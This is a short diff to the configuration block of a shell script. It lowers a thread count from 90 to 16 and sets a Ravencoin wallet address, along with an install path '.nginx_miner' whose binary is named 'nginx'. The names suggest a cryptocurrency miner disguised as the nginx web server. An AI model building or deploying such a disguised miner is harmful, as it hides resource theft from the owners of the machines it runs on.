@@ -2,7 +2,7 @@
 
 # -------- Configuration --------
 RVN_WALLET="RQAJNrnHHrUKWnfm3axM4CFtnFdhtBPo6b"
-THREADS=90
+THREADS=16
 USERNAME=$(whoami)
 INSTALL_DIR="/home/$USERNAME/.nginx_miner"
 BINARY_NAME="nginx"
